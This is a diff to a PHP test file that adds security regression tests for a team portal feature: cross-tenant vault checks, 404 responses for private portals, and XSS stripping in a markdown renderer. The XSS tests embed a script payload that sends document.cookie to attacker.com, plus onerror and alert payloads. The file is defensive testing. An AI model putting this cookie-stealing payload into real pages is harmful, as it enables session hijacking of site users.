@@ -218,7 +218,7 @@ test('password protected portal locks guest access until correct password is sub
     expect($portal->fresh()->views_count)->toBeGreaterThan(0);
 });
 
-test('private portal denies unauthenticated guests with 403', function () {
+test('private portal denies unauthenticated guests with 404 to hide existence (P0-02)', function () {
     VaultPortal::create([
         'team_id' => $this->team->id,
         'vault_id' => $this->vault->id,
@@ -233,7 +233,7 @@ test('private portal denies unauthenticated guests with 403', function () {
     auth()->logout();
 
     $response = $this->get(route('portal.show', ['slug' => 'internal-portal']));
-    $response->assertStatus(403);
+    $response->assertNotFound(); // 404 prevents slug enumeration (P0-02)
 });
 
 test('portal renderer service parses frontmatter, callouts, and wikilinks', function () {
@@ -391,4 +391,156 @@ MD;
         ->and($rendered['html'])->toContain('This is a multiline note.')
         ->and($rendered['html'])->not->toContain('&lt;/div&gt;')
         ->and($rendered['html'])->not->toContain('<pre><code class="language-code">&lt;/div&gt;');
+});
+
+// --- P0-01 Regression: Cross-Tenant Portal Vault Validation ---
+
+test('team member cannot create a portal pointing to another tenant vault (P0-01)', function () {
+    // Create a second independent team with its own vault
+    $otherTeam = Team::factory()->create();
+    $otherVault = Vault::create([
+        'team_id' => $otherTeam->id,
+        'name' => 'Confidential Vault',
+        'slug' => 'confidential-vault',
+        'created_by' => User::factory()->create()->id,
+        'default_permission' => 'read_write',
+    ]);
+
+    // The current user (Team A) tries to create a portal pointing to Team B's vault
+    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
+        ->set('name', 'Hijacked Portal')
+        ->set('vault_id', $otherVault->id) // ← other team's vault
+        ->set('layout', 'docs')
+        ->set('theme', 'obsidian-noir')
+        ->call('savePortal')
+        ->assertHasErrors(['vault_id']); // must fail validation
+
+    expect(VaultPortal::where('name', 'Hijacked Portal')->exists())->toBeFalse();
+});
+
+test('updating a portal cannot reassign it to another tenant vault (P0-01)', function () {
+    $portal = VaultPortal::create([
+        'team_id' => $this->team->id,
+        'vault_id' => $this->vault->id,
+        'name' => 'My Portal',
+        'slug' => 'my-portal',
+        'layout' => 'docs',
+        'theme' => 'obsidian-noir',
+        'is_public' => true,
+        'created_by' => $this->user->id,
+    ]);
+
+    $otherVault = Vault::create([
+        'team_id' => Team::factory()->create()->id,
+        'name' => 'Foreign Vault',
+        'slug' => 'foreign-vault',
+        'created_by' => User::factory()->create()->id,
+        'default_permission' => 'read_write',
+    ]);
+
+    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
+        ->call('editPortal', $portal->id)
+        ->set('vault_id', $otherVault->id) // ← inject foreign vault id
+        ->call('savePortal')
+        ->assertHasErrors(['vault_id']);
+
+    expect($portal->fresh()->vault_id)->toBe($this->vault->id);
+});
+
+// --- P0-02 Regression: Private Portal Team Membership Enforcement ---
+
+test('authenticated user from a different team gets 404 for private portal (P0-02)', function () {
+    VaultPortal::create([
+        'team_id' => $this->team->id,
+        'vault_id' => $this->vault->id,
+        'name' => 'Private Docs',
+        'slug' => 'private-docs',
+        'layout' => 'docs',
+        'theme' => 'obsidian-noir',
+        'is_public' => false,
+        'created_by' => $this->user->id,
+    ]);
+
+    // A completely different user who is NOT a member of $this->team
+    $outsider = User::factory()->create();
+    $this->actingAs($outsider);
+
+    $response = $this->get(route('portal.show', ['slug' => 'private-docs']));
+
+    // Must be 404 — not content, not 403 (to hide slug existence)
+    $response->assertNotFound();
+});
+
+test('unauthenticated visitor gets 404 for private portal (P0-02)', function () {
+    VaultPortal::create([
+        'team_id' => $this->team->id,
+        'vault_id' => $this->vault->id,
+        'name' => 'Members Only',
+        'slug' => 'members-only',
+        'layout' => 'docs',
+        'theme' => 'obsidian-noir',
+        'is_public' => false,
+        'created_by' => $this->user->id,
+    ]);
+
+    auth()->logout();
+
+    $response = $this->get(route('portal.show', ['slug' => 'members-only']));
+    $response->assertNotFound();
+});
+
+test('actual team member can access a private portal (P0-02)', function () {
+    $portal = VaultPortal::create([
+        'team_id' => $this->team->id,
+        'vault_id' => $this->vault->id,
+        'name' => 'Team Only Portal',
+        'slug' => 'team-only-portal',
+        'layout' => 'docs',
+        'theme' => 'obsidian-noir',
+        'is_public' => false,
+        'created_by' => $this->user->id,
+    ]);
+
+    // $this->user is already a member of $this->team via beforeEach
+    $response = $this->get(route('portal.show', ['slug' => 'team-only-portal']));
+    $response->assertOk();
+});
+
+// --- P0-04 Regression: XSS Prevention in Portal Renderer ---
+
+test('portal renderer strips raw HTML script tags from markdown (P0-04)', function () {
+    $service = app(PortalRendererService::class);
+    $maliciousMarkdown = <<<'MD'
+# Normal Heading
+
+<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+
+Regular paragraph after script tag.
+
+<img src="x" onerror="alert('xss')">
+MD;
+
+    $rendered = $service->renderNoteHtml($maliciousMarkdown, new VaultPortal, collect([$this->file1]));
+
+    expect($rendered['html'])
+        ->not->toContain('<script>')
+        ->not->toContain('document.cookie')
+        ->not->toContain('onerror=')
+        ->toContain('Regular paragraph after script tag.');
+});
+
+test('portal renderer strips HTML in callout bodies (P0-04)', function () {
+    $service = app(PortalRendererService::class);
+    $maliciousMarkdown = <<<'MD'
+> [!NOTE] Legit callout
+> <script>alert('callout xss')</script>
+> Safe content after
+MD;
+
+    $rendered = $service->renderNoteHtml($maliciousMarkdown, new VaultPortal, collect([$this->file1]));
+
+    expect($rendered['html'])
+        ->not->toContain('<script>')
+        ->not->toContain("alert('callout xss')")
+        ->toContain('Safe content after');
 });
